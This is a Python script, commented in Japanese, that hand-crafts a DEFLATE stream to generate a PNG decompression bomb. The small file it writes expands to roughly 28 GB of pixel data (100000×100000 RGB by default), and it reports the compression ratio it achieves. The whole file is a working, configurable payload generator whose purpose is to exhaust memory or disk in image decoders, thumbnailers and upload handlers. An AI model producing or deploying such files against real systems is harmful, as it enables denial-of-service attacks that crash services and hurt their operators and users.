import struct
import binascii
import zlib

# =========================================================
# 【ユーザー設定エリア】
# ここを変更するだけで、あらゆるPNG形式の超圧縮爆弾を作れます
# =========================================================

# 1. 画像のサイズ (ピクセル単位)
WIDTH = 100000
HEIGHT = 100000

# 2. PNGカラーフォーマット設定
# COLOR_TYPE: 0=Grayscale, 2=RGB, 3=Indexed, 4=Gray+Alpha, 6=RGBA
COLOR_TYPE = 2

# 3. ビット深度 (1, 2, 4, 8, 16)
# ※COLOR_TYPEによって許可される深度はPNG仕様に依存します
BIT_DEPTH = 8

# 4. 単色、または繰り返すパターンのバイト列
# 【単色ベタ塗りの例】
# 真っ赤なRGBの場合: b'\xff\x00\x00'
# 半透明の黒RGBAの場合: b'\x00\x00\x00\x80'
#
# 【繰り返しパターンの例】
# 青と黄色の縦縞(RGB)の場合: b'\x00\x00\xff\xff\xff\x00'
PATTERN_BYTES = b'\xff\x00\x00'

# 5. Indexedカラー(COLOR_TYPE=3)の場合のパレット設定
# 使わない場合は空のままでOKです
PALETTE = b'' 

OUTPUT_FILENAME = "ultimate_pattern_bomb.png"
# =========================================================


class FastBitWriter:
    """ビット単位の出力を高速に行うためのライター"""
    def __init__(self):
        self.val = 0
        self.bits = 0
        self.out = bytearray()
        
    def write(self, val, bits):
        self.val |= (val << self.bits)
        self.bits += bits
        while self.bits >= 8:
            self.out.append(self.val & 0xFF)
            self.val >>= 8
            self.bits -= 8
            
    def write_zeros(self, count):
        """0ビットを数億回高速に追記する魔法の関数"""
        self.bits += count
        if self.bits >= 8:
            self.out.append(self.val & 0xFF)
            self.val >>= 8
            self.bits -= 8
            zero_bytes = self.bits // 8
            if zero_bytes > 0:
                self.out.extend(b'\x00' * zero_bytes)
                self.bits %= 8
                
    def flush(self):
        if self.bits > 0:
            self.out.append(self.val & 0xFF)
            self.val = 0
            self.bits = 0
        return bytes(self.out)

def rev_bits(val, length):
    """固定ハフマン用のビット反転"""
    res = 0
    for _ in range(length):
        res = (res << 1) | (val & 1)
        val >>= 1
    return res

def get_dist_info(d):
    """LZ77の距離コードと拡張ビットを算出する"""
    d -= 1
    if d < 4: return d, 0, 0
    eb = 0
    while (d >> (eb + 1)) >= 2: eb += 1
    code = (eb + 1) * 2 + ((d >> eb) & 1)
    val = d & ((1 << eb) - 1)
    return code, eb, val

def combine_adler32(adler1, adler2, len2):
    """2つのAdler-32チェックサムを数学的に結合する"""
    BASE = 65521
    a1 = adler1 & 0xffff
    b1 = (adler1 >> 16) & 0xffff
    a2 = adler2 & 0xffff
    b2 = (adler2 >> 16) & 0xffff
    a = (a1 + a2 - 1) % BASE
    b = (b1 + b2 - len2 + a1 * len2) % BASE
    return (b << 16) | a

def adler32_pow(adler, length, count):
    """繰り返し二乗法で同じデータのAdler-32を数億回分一瞬で足し込む"""
    res_adler, res_len = 1, 0
    base_adler, base_len = adler, length
    while count > 0:
        if count & 1:
            res_adler = combine_adler32(res_adler, base_adler, base_len)
            res_len += base_len
        base_adler = combine_adler32(base_adler, base_adler, base_len)
        base_len *= 2
        count >>= 1
    return res_adler

def write_chunk(f, chunk_type, data):
    f.write(struct.pack('>I', len(data)))
    f.write(chunk_type)
    f.write(data)
    f.write(struct.pack('>I', binascii.crc32(data, binascii.crc32(chunk_type)) & 0xffffffff))

def generate():
    # 1行あたりのバイト数を計算
    channels = {0: 1, 2: 3, 3: 1, 4: 2, 6: 4}[COLOR_TYPE]
    bytes_per_row = (WIDTH * channels * BIT_DEPTH + 7) // 8
    
    # ---------------------------------------------------------
    # [準備] O(1)での超高速Adler-32計算
    # ---------------------------------------------------------
    P = len(PATTERN_BYTES)
    # 1行目: Noneフィルタ(0x00) + パターン
    row1_data = bytearray([0x00]) + (PATTERN_BYTES * (bytes_per_row // P + 1))[:bytes_per_row]
    # 2行目以降: Upフィルタ(0x02) + 0x00の連続 (完全に差分がゼロになる)
    row2_data = bytearray([0x02]) + bytearray(bytes_per_row)
    
    a1 = zlib.adler32(row1_data)
    if HEIGHT > 1:
        a2 = zlib.adler32(row2_data)
        a2_all = adler32_pow(a2, len(row2_data), HEIGHT - 1)
        final_adler = combine_adler32(a1, a2_all, len(row2_data) * (HEIGHT - 1))
    else:
        final_adler = a1

    bw = FastBitWriter()
    
    # ---------------------------------------------------------
    # 【ブロック1】 1行目 (固定ハフマン)
    # ここで距離Pを使ったパターンの無限コピーを発動させる
    # ---------------------------------------------------------
    bw.write(0, 1) # BFINAL = 0 (まだ続く)
    bw.write(1, 2) # BTYPE = 01 (Fixed Huffman)
    
    # リテラル出力用クロージャ
    def write_lit(val):
        bw.write(rev_bits(48 + val, 8) if val <= 143 else rev_bits(400 + val - 144, 9), 8 if val <= 143 else 9)

    write_lit(0x00) # Noneフィルタ
    
    d_code, d_extra_bits, d_extra_val = get_dist_info(P)
    
    if bytes_per_row <= P:
        for i in range(bytes_per_row): write_lit(PATTERN_BYTES[i])
    else:
        for b in PATTERN_BYTES: write_lit(b)
        rem_len = bytes_per_row - P
        n258, rem = rem_len // 258, rem_len % 258
        
        # 距離P、長さ258で爆速コピー
        for _ in range(n258):
            bw.write(rev_bits(197, 8), 8) # 長さ258
            bw.write(rev_bits(d_code, 5), 5) # 距離P
            if d_extra_bits > 0: bw.write(d_extra_val, d_extra_bits)
            
        for i in range(rem): write_lit(PATTERN_BYTES[i % P])
        
    bw.write(rev_bits(0, 7), 7) # EOB

    # ---------------------------------------------------------
    # 【ブロック2】 2行目以降 (動的ハフマン)
    # 辞書を極限チューニングし「2ビット=258バイト」状態を作り出す
    # ---------------------------------------------------------
    if HEIGHT > 1:
        bw.write(1, 1)  # BFINAL = 1 (最後のブロック)
        bw.write(2, 2)  # BTYPE = 10 (Dynamic Huffman)
        bw.write(29, 5) # HLIT = 29
        bw.write(1, 5)  # HDIST = 1
        bw.write(14, 4) # HCLEN = 14
        
        # 必要なコード長だけ指定
        cl_lens = [0]*18; cl_lens[16]=2; cl_lens[17]=2; cl_lens[13]=2; cl_lens[2]=2
        for i in range(18): bw.write(cl_lens[i], 3)
        
        def write_cl(sym, ex=0, ex_b=0):
            if sym == 0: bw.write(0, 2)
            elif sym == 1: bw.write(2, 2)
            elif sym == 3: bw.write(1, 2)
            elif sym == 18: bw.write(3, 2); bw.write(ex, ex_b)

        write_cl(3)                # 0x00 -> 長さ3
        write_cl(0)                # 0x01 使わない
        write_cl(3)                # 0x02 -> 長さ3
        write_cl(18, 127, 7)       # 不要なシンボルを削ぎ落とす
        write_cl(18, 104, 7)       
        write_cl(3)                # 256(EOB) -> 長さ3
        write_cl(18, 17, 7)        
        write_cl(1)                # 285(Len258) -> 長さ1 (最強)
        write_cl(1); write_cl(1)   # Dist0, 1 -> 長さ1 (最強)

        # H-1行分の書き込み (メモリ消費ゼロ)
        n258_w = (bytes_per_row - 1) // 258
        rem_w = (bytes_per_row - 1) % 258
        
        for _ in range(HEIGHT - 1):
            bw.write(5, 3) # 0x02 リテラル
            if bytes_per_row > 0:
                bw.write(1, 3) # 0x00 リテラル
                bw.write_zeros(n258_w * 2) # 2ビットで258バイトのゼロ生成×数万回
                for _ in range(rem_w): bw.write(1, 3)
        
        bw.write(3, 3) # EOB
        
    deflate_data = bw.flush()
    zlib_stream = b'\x78\xda' + deflate_data + struct.pack('>I', final_adler)

    # ---------------------------------------------------------
    # 【出力】 PNG組み立て
    # ---------------------------------------------------------
    with open(OUTPUT_FILENAME, 'wb') as f:
        f.write(b'\x89PNG\r\n\x1a\n')
        write_chunk(f, b'IHDR', struct.pack('>IIBBBBB', WIDTH, HEIGHT, BIT_DEPTH, COLOR_TYPE, 0, 0, 0))
        if COLOR_TYPE == 3 and PALETTE:
            write_chunk(f, b'PLTE', PALETTE)
        write_chunk(f, b'IDAT', zlib_stream)
        write_chunk(f, b'IEND', b'')
        
    raw_size = HEIGHT * (bytes_per_row + 1)
    print(f"[{OUTPUT_FILENAME}] 生成完了！")
    print(f"フォーマット: ColorType={COLOR_TYPE}, BitDepth={BIT_DEPTH}")
    print(f"解凍後生データ量: 約 {raw_size / (1024**3):.4f} GB")
    print(f"極限圧縮後サイズ: {len(zlib_stream)} Bytes")
    print(f"実効圧縮率: 約 {raw_size / len(zlib_stream):.1f} 倍")

if __name__ == "__main__":
    generate()
